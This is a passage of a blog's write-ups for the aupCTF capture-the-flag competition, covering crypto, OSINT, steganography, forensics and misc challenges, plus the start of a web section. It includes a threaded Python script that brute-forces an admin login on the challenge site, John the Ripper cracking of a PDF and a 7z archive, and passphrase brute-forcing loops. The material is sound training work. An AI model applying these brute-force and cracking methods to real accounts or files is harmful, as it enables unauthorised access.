[{"content":" Ancient Cipher (100pts) Description Meet Bob, the world\u0026rsquo;s worst cryptographer. His encryption skills are so bad that his messages are basically gibberish. One time, he tried to send a secret message to his friend Alice, but it was so poorly encrypted that his dog was able to decode it. Needless to say, Bob\u0026rsquo;s not winning any cryptography awards anytime soon.\nrlgTKW{S0s'j_Sru_Tipgk0xirgyp_5b1ccj}\nApproach The name of the challenge implies an ancient cipher, which commonly refers to the Caesar cipher.\nFlag: aupCTF{B0b's_Bad_Crypt0graphy_5k1lls}\nRotation (100pts) Description We\u0026rsquo;ve employed a unique technique to encode the message, one that goes beyond the traditional limits of the Caesar cipher. Keep your wits about you and explore every possible avenue - the answer may be closer than you think\n2FAr%uLJ_F\\7_F?5\\\u0026gt;bN\nApproach The challenge name suggests a rotation cipher, but it doesn\u0026rsquo;t appear to be a simple rotation like ROT13. Since the ciphertext does not include the characters \u0026ldquo;{}\u0026rdquo; that would remain unchanged in ROT13, we can explore the possibility of using ROT47 as an alternative rotation cipher.\nNow the ciphertext appears to resemble ROT13, so it\u0026rsquo;s worth attempting that ROT13.\nFlag: aupCTF{B0b's_Bad_Crypt0graphy_5k1lls}\nEnigma (100pts) Description I found an old enigma machine and was messing around with it. can you decipher it\nMACHINE TYPE: `kriegsmarine 3 rotors`\rREFLECTOR: `B`\rROTORS: `I, II, III`\rINITIAL POSITIONS OF THE ROTORS: `X, Y, Z`\rPOSITION OF THE ALPHABET WHEEL: `A, B, C`\rPLUGBOARD: `AT BS DE FM IR KN LZ OW PV XY`\rCIPHER: `LXFUZLVHEJLEWZRIXIS`\rremember to put the flag in format: `aupCTF{answer}` answer in UPPERCASE Approach Since all the values are given we can simply put it in a decoder and get the answer\nFlag: aupCTF{ENIGMAISFASCINATING}\nDisorder (200pts) Description utsa}Ts0aXa{1_eC1ngXph__XF_tmX\nApproach It seems that every letter of the flag format \u0026ldquo;aupCTF{}\u0026rdquo; is present in the ciphertext. A transposition cipher is a good assumption at this point, as it changes the order of the plaintext.\nutsa}Ts0aXa{1_eC1ngXph__XF_tmX By splitting the ciphertext after every 5 letters, we can extract the flag by selecting the letters according to the flag format. utsa} -- 2nd Ts0aX -- 5th a{1_e -- 1st C1ngX -- 4th ph__X -- 3rd F_tmX -- 6th reconstructing the flag aupCTF{th1s_1s_n0t_a_game}XXXX Flag: aupCTF{th1s_1s_n0t_a_game}\nReally Secure Algorithm (200pts) Description Just remember, the key to success is staying calm, cool, and collected. Oh, and maybe a little bit of math.\nChallenge Files: output.txt rsa.py\nApproach rsa.py\nfrom Crypto.Util.number import getStrongPrime, bytes_to_long f = open(\u0026#34;flag.txt\u0026#34;).read() m = bytes_to_long(f.encode()) p = getStrongPrime(512) q = getStrongPrime(512) n = p*q e = 0x10001 c = pow(m,e,n) print(\u0026#34;n =\u0026#34;,n) print(\u0026#34;e =\u0026#34;,e) print(\u0026#34;c =\u0026#34;,c) print(\u0026#34;p + q = \u0026#34;,p + q) print(\u0026#34;p - q = \u0026#34;,p - q) output\nn = 114451512782061350994183549689132403225242966062482357218929786202609314635625168402975465116960672539381904935689924074978793017604108838426275397024126351435336388859375577638687615733448645699186377194544704879027804400841223407182597828299190404980916587708863068950664207317360099871904794302327240026597\re = 0x10001\rc = 77973874950946982309998238055233832655056168217930252243355819182449120246116674359138553216317477143768434108918799869104308920311195408379262816485377057853246446992573203590942762693635615621774057306679349618708293741847308966437868706668452083656318895155238523224237514077565164105837790895618179891869\rp + q = 21400959789031198835597502268226110838410793429486235013163818172148759394109297013195530163943463063090162742198192075506990494863858727035693527345539878\rp - q = 441620610348849769847261104024471204541391170160225757260110727514761526074769013762749528928112909396341014808517549368576708910310103233373547986477636 We can find $p$ and $q$ using python\nfrom sympy import symbols, Eq, solve p, q = symbols(\u0026#39;p q\u0026#39;) eq1 = Eq((p+q), 21400959789031198835597502268226110838410793429486235013163818172148759394109297013195530163943463063090162742198192075506990494863858727035693527345539878) eq2 = Eq((p-q), 441620610348849769847261104024471204541391170160225757260110727514761526074769013762749528928112909396341014808517549368576708910310103233373547986477636) solution = solve((eq1, eq2), (p, q)) print(solution) output\n{p: 10921290199690024302722381686125291021476092299823230385211964449831760460092033013479139846435787986243251878503354812437783601887084415134533537666008757, q: 10479669589341174532875120582100819816934701129663004627951853722316998934017263999716390317507675076846910863694837263069206892976774311901159989679531121} decryption process\rCompute \\(\\phi(n) = (p-1)(q-1)\\). Calculate the modular multiplicative inverse of \\(e\\) modulo \\(\\phi(n)\\), denoted as \\(d\\), such that \\((d \\cdot e) \\bmod \\phi(n) = 1\\).\nIn python we can use inverse function from Crypto.Util.number Compute \\(m = c^d \\bmod n\\). In python pow(c, d, n).\nThe plaintext message, denoted as \\(m\\), can then be obtained by converting the resulting integer value to its corresponding character representation. from Crypto.Util.number import long_to_bytes, inverse p = 10921290199690024302722381686125291021476092299823230385211964449831760460092033013479139846435787986243251878503354812437783601887084415134533537666008757 q = 10479669589341174532875120582100819816934701129663004627951853722316998934017263999716390317507675076846910863694837263069206892976774311901159989679531121 n = p * q e = 65537 # Converted hex 0x10001 to decimal phi = (p - 1) * (q - 1) d = inverse(e, phi) c = 77973874950946982309998238055233832655056168217930252243355819182449120246116674359138553216317477143768434108918799869104308920311195408379262816485377057853246446992573203590942762693635615621774057306679349618708293741847308966437868706668452083656318895155238523224237514077565164105837790895618179891869 m = pow(c, d, n) plaintext = long_to_bytes(m) print(plaintext.decode()) Flag: aupCTF{3a5y_tw0_3quat10n5_and_hax3d_3}\nSwiss Army Knife (200pts) Description decode.txt\nApproach The contents of the file consist solely of \u0026lsquo;X\u0026rsquo; and \u0026lsquo;Y\u0026rsquo; characters, resembling a binary format. \u0026lsquo;X\u0026rsquo; is replaced with \u0026lsquo;0\u0026rsquo;, and \u0026lsquo;Y\u0026rsquo; is replaced with \u0026lsquo;1\u0026rsquo;.\nwhen we can decode multiple encodings one by one, here is the complete racipe\nBinary —\u0026gt; Base64 —\u0026gt; Morse Code —\u0026gt; Base32 —\u0026gt; Rot13\nFlag: aupCTF{mu1tip13-3nc0d1ng5-u53d}\nBattista Bet (200pts) Description My friend is a big fan of the famous Italian cryptographer Giovan Battista Bellaso, he has challenged me to crack this ciphertext. I have been struggling to decode it, Can you help me out\nsyrTXY{T3pnr50A0ndhD3Gv0nv}\nHint💡: The key to decode the message is a SECRET\nApproach from the description its clear that vigenere cipher is used and the key is secret\nFlag: aupCTF{B3lla50W0uldB3Pr0ud}\n","permalink":"https://iasad.me/write-ups/aupctf/cryptography/","summary":"writeups for cryptographic challenges","title":"Cryptography - aupCTF"},{"content":" Git (100pts) Description Do You Know! The current CTF you\u0026rsquo;re participating in is actually running on my BSCS final year project, called fypCTF. Why not take a peek and see if you can find anything interesting? Flag format: aupCTF{your-answer}\nApproach visiting the GitHub repo we can see the l33t words in a tag 5t4r-th3-r3p0\nFlag: aupCTF{5t4r-th3-r3p0}\nAsh (100pts) Description Throughout my gaming journey, I have achieved the incredible feat of being a two-time back-to-back Combo Breaker Champion. I\u0026rsquo;m curious if you can find the exact count of tournaments I have emerged victorious in my primary game.\nFlag format: aupCTF{count}\nApproach A quick Google search reveals that the challenge revolves around Arslan Ash, who impressively secured the title of Combo Breaker Champion two times in a row. Arslan Ash has emerged victorious in numerous tournaments\nfor reliable sports data, Liquipedia as a credible source. According to Liquipedia, Arslan Ash has won a total of 19 taken 7 tournaments.\nFlag: aupCTF{19}\nCenturion (100pts) Description One of the oldest Institution created by the person in the photo. Your task is to find the institution created by him and find the first ever-batch strength and the date it opened.\ncenturion.png\nFlag Format: aupCTF{dd/mm/yy_strengthofthebatch}\nApproach reverse search the image and you will find that the person in the photo is Sir Sahibzada Abdul Qayyum who created Islamia Collage Peshawar\nyou can find the creation date and the strength of first batch in the following 2 articles\nHistorical Background\nThe College began its instructional activities, six months later i.e on 1st October 1913.\nIslamia College, Peshawar\nThe college, which began its educational voyage with just 33 students in 1913, became a full-fledged University in 2008.\nFlag: aupCTF{1/10/1913_33}\nRecords (200pts) Description Our website has been hacked, and the attackers have hidden a flag in an unexpected location in a txt. To find the flag, you\u0026rsquo;ll need to look beyond the usual pages and directories on our website. Keep in mind that the attackers may have used clever tricks to hide the flag, so you\u0026rsquo;ll need to be creative in your search. Remember, the flag may be hiding in plain sight, but you\u0026rsquo;ll need to know where to look. Good luck!\nwebsite\nApproach looking at the DNS records of iasad.me using dnsrecords.io we can find the flag in the txt record\nFlag: aupCTF{st0p-l00k1ing-my-dns-r3c0rds}\nWisdom (200pts) Description I was curious to discover the total number of books present within our library. help me find it\nphoto\nFlag format: aupCTF{TotalBooks-TotalJournals}\nApproach By conducting a reverse image search, you can easily identify the location as the Library of Agriculture University Peshawar. Simply search for \u0026ldquo;Agriculture University Peshawar library\u0026rdquo; and you will come across the official webpage of the library, which can be found here.\nFlag: aupCTF{113600-11605}\nDon\u0026rsquo;t copyvio me (200pts) Desciption I love Wikipedia because it\u0026rsquo;s free and open source to view - but I also hate it because people can remove content if they think it\u0026rsquo;s a \u0026ldquo;copyright violation\u0026rdquo; - even if it\u0026rsquo;s not. Our University kept having that happen to us - but thankfully our page looks pretty great right now!\nCan you tell me who kept doing that to the university and the total bytes of data they deleted? Don\u0026rsquo;t use any commas.\nFlag format: aupCTF{username_#}\nApproach Visit the Wikipedia page of Agriculture University Peshawar and click on \u0026ldquo;View History\u0026rdquo; to access the revision history. Perform a search for \u0026ldquo;copy\u0026rdquo; within the revisions, and you will discover a few relevant results. However, note the title “Don\u0026rsquo;t copyvio me”. Therefore, further searching for “copyvio” yields only two results, both made by user: Joelmills. On first time, he deleted approximately 10,003 bytes, and on second time, approximately 9,966 bytes were removed.\nFlag: aupCTF{Joelmills_19969}\nAbout-Face (300pts) Description I\u0026rsquo;d love to work for a social media company when they\u0026rsquo;re just starting out. Imagine getting a job at thefacebook, I mean facebook, I mean Meta - whatever they want to go by these days, way back when?\nCome to think of it, dropping the from their name was probably the smartest idea they ever had. My uncle said he applied for a role with their Network Operations team after he heard that they dropped \u0026rsquo;the\u0026rsquo; from their name, but never heard back and thinks it\u0026rsquo;s because the person he emailed left their job.\nI don\u0026rsquo;t believe him, but he told me I can always reach out to the person he emailed to confirm. I doubt they still work there, but can you tell me the role he applied for and the first name of the person he reached out to? He said it should be easy to figure out - that team had only one role available that year and he applied before December.\nFlag Format: aupCTF{role_title_firstname} All lowercase.\nApproach There are a few important points from the description:\nwhen did facebook dropped the from Thefacebook? In 2005 when did his uncle applied for the job? before December 2005 his Uncle applied in the network operations team It is well-known that Facebook changed its domain in 2005. Therefore, to gather information about Facebook prior to this change, we should explore the archives before December of that year. By utilizing the Wayback Machine and searching for facebook.com, we can access numerous snapshots. Our focus lies on the year 2005, specifically before December.\nLet\u0026rsquo;s examine the snapshot from November 27, 2005\nUpon examining the jobs page, various positions are listed. However, the specific job we are interested in can be found within the operations department.\nFlag: aupCTF{senior_linux_systems_administrator_robin}\n","permalink":"https://iasad.me/write-ups/aupctf/osint/","summary":"writeups for OSINT challenges","title":"OSINT - aupCTF"},{"content":" Syrio Forel (100pts) Description dump\nFlag format:aupCTF{***_*****}\nApproach the dump file contains a very large base64 string\ lets decode it\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ cat dump.txt | base64 -d \u0026gt; data ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ file data data: JPEG image data, JFIF standard 1.01 ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ mv data photo.jpeg When the photo is revealed, we encounter a famous dialogue from Game of Thrones. Syrio Forel asks Arya Stark, \u0026ldquo;What do we say to the god of death?\u0026rdquo; Arya replies, \u0026ldquo;Not today.”\nFlag: not_today\nMasterpeice (100pts) Description chahat has something for you listen carefully till the end.\nmasterpiece.wav\nApproach the first thing I do with audio steganography is to look for Spectrogram. you can use sonic-visualiser to do this.\nOpen the file \u0026ldquo;masterpiece.wav\u0026rdquo; using sonic-visualiser and navigate to the \u0026ldquo;Layer\u0026rdquo; section. and add Spectrogram layer, scroll to the end and you will get the flag\nFlag: aupCTF{Sp3ct0gr4m_ri4ght}\nLSB (100pts) Description you got this\u0026hellip;file\nApproach its clear from the name of the challenge that flag is hidden in least significant bits we can use zsteg to extract the flag\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ zsteg naruto.png imagedata .. text: \u0026#34;$:;`VV(-1\u0026#34; b1,b,lsb,xy .. file: OpenPGP Secret Key b1,rgb,lsb,xy .. text: \u0026#34;aupCTF{zst1g-1s-c00l_rig3ht}\u0026#34; b2,rgb,lsb,xy .. file: big endian ispell 3.0 hash file Flag: aupCTF{zst1g-1s-c00l_rig3ht}\nDeep (200pts) Description truefan.wav\nFlag format: aupCTF{****_****}\nHint💡: looking for password ? well thats the iconic dialogue of iron man\nApproach its a very large audio file and we know an audio stego tool that can hide very large data in audio files and the name of the challenge also hint to that its deepsound\nUpon opening the file using DeepSound, we successfully uncover the hidden data, which happens to be password-protected. Following the provided hint, we enter \u0026ldquo;iamironman\u0026rdquo; as the password, and indeed, it is the currect password.\nWe have obtained an executable file named \u0026ldquo;marvel.exe.\u0026rdquo; you have two options: either decompile the file or answer a series of questions to obtain the flag.\nAs a marvel fan I can answer the question\nNow that we have the flag format, we know that Iron Man made his first appearance in 2008 and his last appearance in 2019. Therefore, the flag is \u0026ldquo;aupCTF{2008_2019}\u0026rdquo;.\nFlag: aupCTF{2008_2019}\nObfuscated (200pts) Description download file\nApproach we have a broken image lets compare its magic bytes with a real jpeg image\nGiven File Header: FF 8D FF 0E 00 01 A4 64 94 64 00 10 Real JPEG Header: FF D8 FF E0 00 10 4A 46 49 46 00 01\nwe can use that every 2 bytes are swaped in the whole image, we can fix it using python\ndef reverse_hex_swap_in_jpg(file_path): with open(file_path, \u0026#39;rb\u0026#39;) as file: data = file.read() hex_data = data.hex() reversed_hex_data = \u0026#39;\u0026#39;.join([hex_data[i+1] + hex_data[i] for i in range(0, len(hex_data), 2)]) reversed_data = bytes.fromhex(reversed_hex_data) new_file_path = recovered + \u0026#39;.jpg\u0026#39; with open(new_file_path, \u0026#39;wb\u0026#39;) as new_file: new_file.write(reversed_data) print(f\u0026#34;Hex values reversed successfully. JPG saved as \u0026#39;{new_file_path}\u0026#39;.\u0026#34;) jpg_file_path = \u0026#39;flag.jpg\u0026#39; reverse_hex_swap_in_jpg(jpg_file_path) Flag: aupCTF{sw4p3d_w0w453?5422asd!1}\nXOR (300pts) Description Approach Two noise images are provided for the challenge, and the task name implies that we need to perform an XOR operation on the two images. This can be accomplished using either a Python script or the stegsolve.jar tool.\nHere is a Python script that can perform the required XOR operation:\nfrom PIL import Image img1 = Image.open(\u0026#34;img1.png\u0026#34;) img2 = Image.open(\u0026#34;img2.png\u0026#34;) original_image = Image.new(\u0026#34;RGB\u0026#34;, img1.size) for x in range(img1.width): for y in range(img1.height): pixel_img1 = img1.getpixel((x, y)) pixel_img2 = img2.getpixel((x, y)) original_pixel = tuple(p1 ^ p2 for p1, p2 in zip(pixel_img1, pixel_img2)) original_image.putpixel((x, y), original_pixel) original_image.save(\u0026#34;recovered.png\u0026#34;) Another approach is to use stegsolve.jar:\nOpen img1 using stegsolve.jar. Go to the \u0026ldquo;Analyze\u0026rdquo; tab and select \u0026ldquo;Image Combiner.\u0026rdquo; and add **img2** Resultant Image\nIt appears that we have YouTube Shorts ID \u0026ldquo;LYkCU8Kn3a8.\u0026rdquo; To verify its contents, we can visit the URL https://www.youtube.com/shorts/LYkCU8Kn3a8.\nUpon visiting the page, we find that the video displays random color hues. The description of the video hints that it may be a cipher. A simple Google search reveals that it is indeed a Hexahue cipher.\nTo decode the cipher, we can use the following online tool: https://www.dcode.fr/hexahue-cipher.\nAfter decoding the Hexahue cipher using the provided website, we successfully obtained our flag.\nFlag: aupCTF{W0WGRAPS}\nArcane (300pts) Description Approach Given is an archive file with a .exe extension. When executed, it generates a directory containing 1000 images of Jinx, along with an img file.\nThe img file appears to be corrupted. Upon examining its hex code, it is confirmed that it is a PNG file with a corrupted magic header. To fix this issue, we need to repair the magic header and then open the image. you can find the correct magic header for PNG here\nAfter repairing the image and opening it, we find that it is as a plain white image. To further investigate and extract any hidden data, we can utilize a tool called stegsolve.jar. This tool enables us to analyze and extract hidden information from images.\nBlue plane 3 gives us this: a hint\nThe given hint suggests that the password to unlock the flag is the name of the character, which is \u0026ldquo;jinx\u0026rdquo;. To extract hidden data from JPEG images, we can utilize a tool called steghide. However, manually applying steghide to all 1000 images is impractical. To automate the process, we can use a bash one-liner.\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ ls | while read line; do steghide extract -sf $line -p \u0026#34;jinx\u0026#34;; done ------------MORE---------------- steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! wrote extracted data to \u0026#34;flag.txt\u0026#34;. ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ cat flag.txt aupCTF{JinxTheArcaneTrickster} Flag: aupCTF{JinxTheArcaneTrickster}\n","permalink":"https://iasad.me/write-ups/aupctf/stego/","summary":"writeups for steganography challenges","title":"Steganography - aupCTF"},{"content":" Threat (100pts) Description Tom had always been curious about programming, and one day he stumbled upon a new coding language that he had never heard of before. Excited to learn more, he asked ChatGPT for some resources to get started. ChatGPT provided a link to a website that had some useful tutorials and code samples. But when Tom tried to download one of the files, his computer started behaving strangely. After running the commands md5sum tutorial.pdf \u0026gt; result.txt and cat result.txt, the following output is received: d0ee6ffc8ce0e7f21cdcbd5e98c2dd4174a5d1b0266ec7f69075a0d9bea14757\nFlag Format: aupCTF{popular threat label}\nApproach High probability that its a Virus so lets search the hash on VirusTotal and we get this\nhttps://www.virustotal.com/gui/file/d0ee6ffc8ce0e7f21cdcbd5e98c2dd4174a5d1b0266ec7f69075a0d9bea14757\nFlag: aupCTF{trojan.nanocore/msil}\nI Love Math (100pts) Description Challenge: math\nApproach The challenge file is a pdf, with a week password. and can be easily cracked with john\npdf2john math.pdf \u0026gt; hash\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ john hash Using default input encoding: UTF-8 Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64]) Cost 1 (revision) is 6 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status naruto (math.pdf) 1g 0:00:00:00 DONE (2023-06-26 15:38) Use the \u0026#34;--show --format=PDF\u0026#34; options to display all of the cracked passwords Session completed. Open the document, but its empty! I can't see anything here. try selecting all text (Ctrl+A) to reveal potentially invisible text.\nnow do some math revision and you will get the flag\nFlag: aupCTF{I_Love_Math_6_1}\nPassword Recovery (200pts) Description We stumble upon a lost smartphone that holds crucial data for an ongoing investigation. Unfortunately, the owner seems to have forgotten the screen lock password, but there is a glimmer of hope. The victim, in an attempt to remember the password, left a clue on the phone\u0026rsquo;s lock screen. use your forensics skills to find the password.\nChallenge file\nHint💡: In android lock screen info is saved in a database\nApproach Once the download and extraction process is complete, we discover that it\u0026rsquo;s a disk image (.dd). The description suggests that this image contains data from a smartphone, and the hint suggest to locate a lock screen database and find what the user left behind on the lookscreen.\nwe can use either FTK® Imager or Autopsy to for this task\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ echo -n \u0026#39;cDQkc3cwMDByZENMVTM=\u0026#39; | base64 -d p4$sw000rdCLU3 Flag: aupCTF{p4$sw000rdCLU3}\nKingsman (300pts) Description Welcome to Kingsman, the world\u0026rsquo;s most elite intelligence agency where we pride ourselves on our cutting-edge technology. However, it appears that our highly sophisticated security system has been breached by an unknown hacker. Even our state-of-the-art AI, Merlin, has failed to protect our system against this intrusion. Your mission, if you choose to accept it, is to use your advanced decryption skills to bypass our highly flawed password policy and uncover the secrets that lie within. Get ready for the ultimate test of your intelligence as you embark on this daring mission to decrypt the hidden message that awaits. Only by cracking the code will you be able to claim your victory and prove yourself worthy of becoming a Kingsman agent. So, are you ready to accept this challenge?\nThe password requirements are as follows:\nThe first character must be a digit. The second character must be a special character. \u0026quot; ! @ $ % ^ \u0026amp; * ( ) \u0026quot; A pet name should follow the special character. An uppercase letter comes next. Finally, a lowercase letter. Remember, Your objective is to crack the encryption and reveal the hidden message.\nChallenge file: encrypted.7z\nHint💡: Don\u0026rsquo;t tell anyone that i gave you names of the pets\nApproach We have a password-protected file accompanied by a password policy in the provided description. Our task is to generate a wordlist that follows above rules using either crunch tool or Python.\nPassword Policy: Number + Spacial char + Pet name + Uppercase + Lowercase\nimport string special_chars = \u0026#34;!@#$%^\u0026amp;*()_+\u0026#34; pets = [\u0026#34;roxy\u0026#34;] for pet in pets: for char in special_chars: for digit in range(10): for upper in string.ascii_uppercase: for lower in string.ascii_lowercase: password = str(digit) + char + pet + upper + lower print(password) with open(\u0026#39;wordlist.txt\u0026#39;, \u0026#39;a\u0026#39;) as f: f.write(password + \u0026#39;\\n\u0026#39;) Now that we have the wordlist, let\u0026rsquo;s proceed with cracking the password. First we need to convert the file\u0026rsquo;s hash using the command 7z2john \u0026gt; hash.\n┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ john hash --wordlist=wordlist.txt Using default input encoding: UTF-8 Loaded 1 password hash (7z, 7-Zip archive encryption) No password hashes left to crack (see FAQ) ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ john hash --show secret.7z:9@roxyFk 1 password hash cracked, 0 left ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ 7z x encrypted.7z # Extract Zip ... ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ cat flag.txt Here is your Reward YXVwQ1RGe2owaG5jcjRjazVwYTU1dzByZDUhfQ== ┌──(kali㉿iasad)-[~/CTFs/aupctf] └─$ echo -n \u0026#39;YXVwQ1RGe2owaG5jcjRjazVwYTU1dzByZDUhfQ==\u0026#39; | base64 -d aupCTF{j0hncr4ck5pa55w0rd5!} Flag: aupCTF{j0hncr4ck5pa55w0rd5!}\nMemDump (300pts) Description You are investigating a potential security incident within your organization. Malicious activity has been detected on one of the company\u0026rsquo;s servers. To gather more information, you need to analyze a memory image of the affected server. You are provided with a memory image of the infected host.\nyou need to download the memory image from this link: download file\nYour goal is to find the flag, which consists of the process name of the malicious activity.\nFlag format: aupCTF{processname.exe}\nApproach Once the file has been downloaded, it appears to be a memory dump. The description asks us to search for any potential malware within it. To do this, we can use a tool called \u0026ldquo;volatility,\u0026rdquo; which offers a useful plugin called \u0026ldquo;malfind.\u0026rdquo; By executing a simple command using this plugin, we can identify any suspicious or malicious processes present in the memory dump.\nthe commands in volatility2 and vol3 are different here is a nice cheatsheet\nFlag: aupCTF{notepad.exe}\n","permalink":"https://iasad.me/write-ups/aupctf/forensics/","summary":"writeups for forensics challenges","title":"Forensics - aupCTF"},{"content":" Fun (100pts) Description WTF is This\nApproach with dcode cipher identifier it\u0026rsquo;s clear that the text is jsfuck where you can write javascript with only 6 characters [][(![]+[])\nusing jsfuck decoder we can get the flag\nFlag: aupCTF{j4v45c1pt_but_f*ck3d}\nSanity check (100pts) Description Have you checked the Rules\nApproach flag is in the rules\nFlag: aupCTF{5an1ty-ch3ck}\nZoo (100pts) Description when was the first ever video uploaded on youtube?.\nFlag format: aupCTF{epoch}\nApproach we can easily find the time of first video uploaded on youtube because it has a Wikipedia page\nbut the challenge wants the date in epoch (UNIX time), Using epochConverter we can convert the time and get the flag\nFlag: aupCTF{1114313512}\nFrequency (100pts) Description My friend was making a call on his iconic Nokia 3310. Can you figure out who he was calling?\nrec\nApproach with a little googling, you can find that these tunes are DTMF tunes we can decode them here\nFlag: aupCTF{00923456060484}\npHash (200pts) Description login source\nHint💡: Who was the character that fans speculated would appear in a \u0026ldquo;Marvel Show\u0026rdquo; but ultimately did not make an appearance?\nApproach the hint was not very clear only marvel nerds could have guessed it but the name was present in the marvel.txt in github\nGiven in description are login page and its source code, by looking at the source code, it\u0026rsquo;s clear that we can only obtain the flag under specific conditions. The username must be \u0026ldquo;admin,\u0026rdquo; and the password needs to be the MD5 hash of a randomly chosen word from the \u0026ldquo;marvel.txt\u0026rdquo; file.\nfrom django.shortcuts import render from django.contrib import messages import hashlib import random with open(\u0026#39;marvel.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;, errors=\u0026#39;ignore\u0026#39;) as file: wordlist = file.read().splitlines().lower() random_word = random.choice(wordlist) random_md5 = hashlib.md5(random_word.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() def login(request): if request.method == \u0026#39;POST\u0026#39;: username = request.POST.get(\u0026#39;username\u0026#39;) password = request.POST.get(\u0026#39;password\u0026#39;) if username == \u0026#39;admin\u0026#39; and password == random_md5: messages.success(request, \u0026#39;Congratulations! Here is your flag [REDACTED]\u0026#39;) else: messages.error(request, \u0026#39;Invalid username or password.\u0026#39;) return render(request, \u0026#39;phash.html\u0026#39;) We can use a Python script to automatically try different passwords on a login page. we\u0026rsquo;ll use \u0026ldquo;admin\u0026rdquo; as the username as given in the source code and the MD5 hash of each word in marvel.txt as the password. it\u0026rsquo;ll keep trying different passwords until we find the correct one. To speed up the process, we can use multiple threads to handle multiple attempts at the same time.\nhere is a simple script that will do the job\nimport hashlib import requests from concurrent.futures import ThreadPoolExecutor def check_password(password): username = \u0026#34;admin\u0026#34; url = \u0026#34;https://challs.aupctf.live/phash/\u0026#34; password = password.strip() password_hash = hashlib.md5(password.encode()).hexdigest() payload = { \u0026#34;username\u0026#34;: username, \u0026#34;password\u0026#34;: password_hash } response = requests.post(url, data=payload) print(\u0026#34;Trying... \u0026#34;+password+\u0026#34; hash: \u0026#34;+password_hash) if \u0026#34;aupCTF\u0026#34; in response.text: print(\u0026#34;Password found:\u0026#34;, password) def bruteforce_login(): with open(\u0026#34;list.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;, errors=\u0026#34;ignore\u0026#34;) as wordlist: passwords = wordlist.readlines() with ThreadPoolExecutor() as executor: executor.map(check_password, passwords) bruteforce_login() Result\n┌──(kali㉿iasad)-[~/CTFs/aupctf/phash] └─$ python script.py -------MORE------- Trying... electro hash: 827ccb0eea8a706c4c34a16891f84e7b Trying... sandman hash: f25a2fc72690b780b2a14e140ef6a9e0 Trying... gwen hash: 25f9e794323b453885f5181f1b624d0b Trying... silverserfer hash: e10adc3949ba59abbe56e057f20f883e Trying... ghostrider hash: f4f068e71e0d87bf0ad51e6214ab84e9 Trying... nebula hash: 53dd9c6005f3cdfc5a69c5c07388016d Trying... hulk hash: 74d738020dca22a731e30058ac7242ee Trying... wanda hash: 4297f44b13955235245b2497399d7a93 Password found: mephisto Trying... wintersolder hash: d177b4d1d9e6b6fa86521e4b3d00b029 Trying... ironman hash: 596a96cc7bf9108cd896f33c44aedc8a Flag: aupCTF{y0u-ar3-a-tru3-m4rv3l-f4n}\nThe circle of life (200pts) Description This message was intercepted by our secret agent but we don\u0026rsquo;t know how to read it. Help us to find secret of the circle.\nfile\nApproach Given code is G-code, short for “Geometric Code,” it is a programming language used in computer numerical control (CNC) machines to control their movements and operations. It consists of a series of instructions that tell the machine how to perform specific tasks, such as moving the tool along a particular path, cutting or shaping materials, and controlling various machine functions.\nThere’s a great tool to visualize gcode at https://ncviewer.com.\nFlag: aupCTF{Ti3_i3_fu9_rig4ht}\nMr white (300pts) Description Approach we are given 2 files a jpg and a audio file\nlistening to the audio file looks like morse code after decoding we got this\nafter reversing the audio and listening we find that the audio played is from the famous series Beaking Bad\nthen looking at the other file\nlooking at **exif** data we find a Comment : where did the protagonist lived ?\n┌──(kali㉿iasad)-[~/CTFs/aupctf/mr-white] └─$ exiftool doc.jpg ExifTool Version Number : 12.57 File Name : doc.jpg JFIF Version : 1.02 Resolution Unit : None X Resolution : 100 Y Resolution : 100 Comment : where did the protagonist lived ? Image Width : 600 Image Height : 337 now this is clear that the challenge is about breaking bad we can answer where did the protagonist lived. you can find it with a simple google search. he lived at albuquerque\nputting albuquerque as password on steghide we found a hidden wordlist\nit is a small wordlist so we can try steghide the audio file with this and yes it worked skyler was the password. you can do that with a bash oneliner\n┌──(kali㉿iasad)-[~/CTFs/aupctf/mr-white] └─$ for password in $(cat wordlist.txt); do steghide extract -sf alchemist.wav -p $password; done steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! steghide: could not extract any data with that passphrase! wrote extracted data to \u0026#34;image.gz\u0026#34;. looking at the extracted data looks like base64encoded image you can use online decoder to convert it to image\nits a base64 string upon converting we got a youtube video link which has the flag format in the description\ngoing back to the wordlist and collecting only first latter from each word we got the flag\nFlag: aupCTF{iamtheonewhoknocks}\n","permalink":"https://iasad.me/write-ups/aupctf/misc/","summary":"writeups for Misc challenges","title":"Misc - aupCTF"},{"content":" Starter (100pts) Description mera tu sir chakra raha tum dekh lo \u0026hellip; random\nApproach When we look it the website, we notice that each letter of the flag is scattered randomly across different parts of the screen. However, looking at the source code, we can find the flag.\nFlag: aupCTF{w45n't-th47-h4rd-r1gh7}\nHeader (100pts) Description Carefully analyze the source code. Click Here\nApproach visiting the site we get the source code\ndef headar_easy(request): if request.META.get(\u0026#39;HTTP_GETFLAG\u0026#39;) == \u0026#39;yes\u0026#39;: context = { \u0026#39;flag\u0026#39;: \u0026#39;[REDACTED]\u0026#39;, } return render(request, \u0026#39;aa/flag.html\u0026#39;, context) return render(request, \u0026#39;aa/index.html\u0026#39;) Upon inspecting the source code, it’s clear that when we send a request to the site with a specific header 